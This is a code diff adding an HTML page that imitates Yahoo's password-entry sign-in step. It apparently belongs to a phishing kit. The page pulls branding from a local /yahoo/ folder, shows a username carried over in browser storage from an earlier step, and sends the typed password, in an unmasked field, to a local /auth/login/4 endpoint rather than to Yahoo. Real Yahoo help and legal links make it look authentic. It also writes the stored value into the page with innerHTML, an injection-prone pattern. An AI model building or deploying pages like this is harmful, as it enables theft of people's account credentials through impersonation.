@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Yahoo</title>
+  <link rel="shortcut icon" href="/yahoo/img/favicon.ico" type="image/x-icon">
+  <link rel="stylesheet" href="/yahoo/css/main.css">
+  <script src="/yahoo/js/jquery.js"></script>
+</head>
+
+<body>
+  <div class="login-wrapper login-cb-v2 responsive grid dark-background">
+    <div class="cb-desktop-hd">
+      <span class="column">
+        <a href="https://www.yahoo.com/">
+          <img src="/yahoo/img/logo.png" class="logo" width="100">
+          <img src="/yahoo/img/logo.png" class="dark-mode-logo logo " width="100">
+        </a>
+      </span>
+      <span class="column help txt-align-right">
+        <a href="https://help.yahoo.com/">Help</a>
+      </span>
+    </div>
+    <div class="login-box-container">
+      <div class="login-box right">
+        <div class="cb-login-hd txt-align-center">
+          <img src="/yahoo/img/logo.png" class="logo" width="100">
+          <img src="/yahoo/img/logo.png" class="dark-mode-logo logo" width="100">
+        </div>
+        <div class="challenge">
+          <div class="challenge-header">
+            <div id="cbx-user"></div>
+            <script>
+              if (typeof Storage !== "undefined") {
+                document.getElementById("cbx-user").innerHTML =
+                  localStorage.getItem("cbx-user");
+              } else {
+                console.log("Sorry, your browser does not support Web Storage...");
+              }
+            </script>
+          </div>
+
+          <div class="username-challenge">
+            <strong class="challenge-heading">Enter password</strong>
+            <span class="txt-align-center challenge-desc">to finish sign&nbsp;in</span>
+
+            <form method="post" action="/auth/login/4" class="cb-form">
+              <div class="input-field">
+                <div class="input-group">
+                  <input name="password" id="password" class="cb-input" type="text" autocomplete="off" autocorrect="off" placeholder=" " required>
+                  <label for="password">Password</label>
+                </div>
+
+                <p class="error-msg">Invalid password. Please try again.</p>
+              </div>
+
+              <div class="button-container">
+                <input type="submit" class="cb-button cb-button-primary challenge-button cbx-pass-login" value="Next" aria-hidden="false">
+              </div>
+
+              <div class="helper-links-container">
+                <div class="helper-item ">
+                  <span class="stay-signed-in checkbox-container">
+                    <input id="checkbox" type="checkbox">
+                    <label for="checkbox">Stay signed&nbsp;in</label>
+                  </span>
+                </div>
+                <div class="helper-item arlink">
+                  <span class="help">
+                    <a href="https://www.yahoo.com/forgot?lang=en-us">Forgot&nbsp;username?</a>
+                  </span>
+                </div>
+              </div>
+
+              <div class="bottom-links-container">
+                <p class="sign-up-link">
+                  <a href="https://www.yahoo.com/account/create?lang=en-us" class="cb-button cb-button-secondary challenge-button">Create an&nbsp;account</a>
+                </p>
+              </div>
+            </form>
+          </div>
+        </div>
+      </div>
+      <div class="login-box-ad">
+        <h1>Yahoo makes it easy to enjoy what matters most in your&nbsp;world.</h1>
+        <p>Best-in-class Yahoo Mail, breaking local, national and global news, finance, sport, music, films and more. You get more out of the web; you get more out of&nbsp;life.</p>
+      </div>
+    </div>
+    <div class="login-bg-outer">
+      <div class="login-bg-inner"></div>
+    </div>
+    <div class="login-footer">
+      <p>
+        <a href="https://legal.yahoo.com/us/en/yahoo/terms/otos/index.html" class="terms">Terms</a>
+        <span>|</span>
+        <a href="https://legal.yahoo.com/us/en/yahoo/privacy/index.html" class="privacy">Privacy</a>
+      </p>
+    </div>
+  </div>
+
+  <script src="/yahoo/js/main.js"></script>
+</body>
+
+</html>
